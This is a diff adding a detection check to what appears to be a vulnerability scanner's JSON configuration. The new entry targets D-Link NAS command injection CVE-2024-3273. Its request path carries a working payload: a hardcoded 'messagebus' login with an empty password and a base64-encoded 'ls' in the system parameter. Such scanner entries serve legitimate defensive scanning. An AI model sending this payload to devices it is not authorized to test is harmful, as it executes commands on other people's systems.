@@ -241,6 +241,30 @@
                 "condition": "AND"
             },
             "issue": "ContaCam Web Interface Publicly Exposed Without Authentication"
+        },
+        "D-Link NAS CVE-2024-3273": {
+            "tag": "D-Link",
+            "payload": {
+                "paths": [
+                    "cgi-bin/nas_sharing.cgi?user=messagebus&passwd=&cmd=15&system=bHM="
+                ],
+                "headers": {
+                    "Upgrade-Insecure-Requests": "1",
+                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Safari/537.36",
+                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
+                    "Accept-Encoding": "gzip, deflate, br",
+                    "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8"
+                },
+                "method": "GET"
+            },
+            "matchers": {
+                "strings": [
+                    "config", "nas_sharing", "cgi"
+                ],
+                "response_code": 200,
+                "condition": "AND"
+            },
+            "issue": "D-Link NAS Instance Vulnerable to Command Injection - CVE-2024-3273"
         }
     }
 }
